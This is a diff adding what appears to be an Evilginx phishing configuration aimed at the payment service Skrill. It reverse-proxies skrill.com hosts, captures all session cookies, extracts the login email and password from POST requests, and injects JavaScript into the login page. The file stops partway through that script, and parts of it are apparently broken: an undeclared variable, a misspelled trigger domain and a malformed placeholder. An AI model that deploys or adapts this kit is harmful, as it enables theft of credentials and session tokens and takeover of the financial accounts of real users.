@@ -1,0 +1,41 @@
+name: 'skrill'
+author: '@moi'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'skrill.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'skrill.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'account.skrill.com', orig_sub: 'www', domain: 'skrill.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname__regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'account.skrill.com', orig_sub: 'www', domain: 'skrill.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.skrill.com'
+    keys: ['.*,regexp']
+  - domain: 'account.skrill.com'
+    keys: ['.*,regexp']
+auth_urls: 
+ - 'wallet/ng/dashboard'
+credentials:
+  username:
+    key: 'login_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'login_password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'account.skrill.com'
+  path: 'wallet/account/login' 
+js_inject:
+  - trigger_domains: ["acount.skrill.com"]
+    trigger_paths: ["wallet/account/login"]
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+        var email = document.querySelector("#email");
+        if (email != null && password != null) {
+          email.value = "{email}";
+          return;
+        }
+        setTimeout(function(){lp();}, 100);
